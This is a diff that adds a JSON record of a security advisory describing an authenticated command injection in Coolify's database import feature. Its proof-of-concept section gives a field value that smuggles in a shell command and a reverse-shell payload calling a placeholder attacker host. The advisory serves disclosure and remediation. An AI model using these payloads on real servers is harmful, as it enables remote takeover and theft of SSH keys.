@@ -1,0 +1,50 @@
+{
+  "global": null,
+  "id": "GHSA-q33h-22xm-4cgh",
+  "repo": {
+    "cve_id": "CVE-2025-66210",
+    "cvss_severities": {
+      "cvss_v3": {
+        "score": 9.9,
+        "vector_string": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H"
+      },
+      "cvss_v4": {
+        "score": null,
+        "vector_string": null
+      }
+    },
+    "cwe_ids": [
+      "CWE-78"
+    ],
+    "description": "### Summary\r\nAn authenticated command injection vulnerability in the database import functionality allows attackers to execute arbitrary commands on managed servers, leading to full infrastructure compromise.\r\n\r\n### Details\r\nUser-controlled input is passed directly to shell commands without sanitization in `app/Livewire/Project/Database/Import.php`.\r\n\r\n**Vulnerable Code (Line 156):**\r\n```php\r\ninstant_remote_process([\"ls -l {$this->customLocation}\"], $this->server);\r\n```\r\n\r\n**Vulnerable Code (Line 184):**\r\n```php\r\n$this->importCommands[] = \"docker cp {$this->customLocation} {$this->container}:{$backupFileName}\";\r\n```\r\n\r\nThe `$this->customLocation` parameter is bound directly from user input via Livewire (`wire:model='customLocation'`) without any sanitization or use of `escapeshellarg()`.\r\n\r\n**Additional injectable parameters:**\r\n- `$this->postgresqlRestoreCommand` (Line 49)\r\n- `$this->mysqlRestoreCommand` (Line 51)\r\n- `$this->mariadbRestoreCommand` (Line 53)\r\n- `$this->mongodbRestoreCommand` (Line 55)\r\n\r\n### PoC\r\n1. Login to Coolify as any user with database access\r\n2. Navigate to: Projects → [Project] → [Database] → Backups → Import\r\n3. In the \"Custom Location\" field, enter:\r\n\r\n/tmp/x; id > /tmp/pwned.txt; echo\r\n\r\n4. Click Import\r\n5. Verify RCE: `cat /tmp/pwned.txt` on target server\r\n\r\n**Reverse Shell:**\r\n/tmp/x; bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1'; #\r\n\r\n### Impact\r\n- **CVSS 9.9 Critical** - `AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H`\r\n- Full remote code execution on managed servers\r\n- Access to SSH private keys stored at `/var/www/html/storage/app/ssh/keys/`\r\n- Lateral movement to ALL servers managed by Coolify\r\n- Complete data breach of all databases and applications\r\n\r\n### Remediation\r\n```php\r\n// Use escapeshellarg() on all user input:\r\n$safeLocation = escapeshellarg($this->customLocation);\r\ninstant_remote_process([\"ls -l {$safeLocation}\"], $this->server);\r\n```\r\n\r\n\r\n\r\n",
+    "ghsa_id": "GHSA-q33h-22xm-4cgh",
+    "html_url": "https://github.com/coollabsio/coolify/security/advisories/GHSA-q33h-22xm-4cgh",
+    "identifiers": [
+      {
+        "type": "GHSA",
+        "value": "GHSA-q33h-22xm-4cgh"
+      },
+      {
+        "type": "CVE",
+        "value": "CVE-2025-66210"
+      }
+    ],
+    "published_at": "2026-01-03T15:13:56Z",
+    "references": [],
+    "severity": "critical",
+    "summary": "Authenticated Remote Code Execution via Command Injection in Database Import",
+    "updated_at": "2026-01-03T15:13:56Z",
+    "vulnerabilities": [
+      {
+        "package": {
+          "ecosystem": "",
+          "name": "coolify"
+        },
+        "patched_versions": ">= 4.0.0-beta.451",
+        "vulnerable_version_range": "<= 4.0.0-beta.448"
+      }
+    ],
+    "withdrawn_at": null
+  },
+  "repository": "coollabsio/coolify"
+}
